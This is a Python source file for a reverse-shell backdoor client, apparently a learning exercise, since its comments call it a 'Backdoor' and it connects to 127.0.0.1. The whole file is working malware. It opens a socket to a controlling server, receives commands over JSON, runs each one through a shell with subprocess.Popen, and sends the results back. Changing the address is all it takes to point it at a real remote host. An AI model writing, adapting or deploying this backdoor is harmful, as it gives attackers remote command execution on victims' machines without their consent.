##!/usr/bin/python
import socket
import subprocess
import json

# Passing 'data' as arg
def reliable_send(data):
    json_data = json.dumps(data)
    # To allow us sending as much commands & inputs as possible
    sock.send(json_data.encode())

def reliable_recv():
    # Pre
    json_data = b''
    # To allow us run Backdoor until out of bytes
    # Instead of just 1024 bytes
    while True:
        try:
            json_data += sock.recv(1024)
            # If target.recv <= 1024 bytes
            return json.loads(json_data.decode())
            
        except ValueError:
            # If we get ValueError
            # Will go over reliable_recv() over & over
            # This will break the contents down to 1024 bytes each time
            continue

def shell():
    while True:
        #command = sock.recv(1024)
        command = reliable_recv()
        #print(command.decode())

        #if message.decode() == 'q':
        if command.strip() == 'q':
            break
            # continue to sock.close()
        else:
            try:
                #message_back = input(f'Type Message to send to Server: ')
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                #sock.send(result)
                reliable_send(result.decode())
                #sock.send(message_back.encode())
            except Exception as e:
                error_message = f'[!!] Cannot Execute this command: {str(e)}'
                reliable_send(error_message)

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
IP_ADDRESS = '127.0.0.1'
port = 54321
sock.connect((IP_ADDRESS, port))
print(f'Connection Established to Server!')
shell()
#answer = "Server: Hello Back!"
#sock.send(answer.encode())
sock.close()
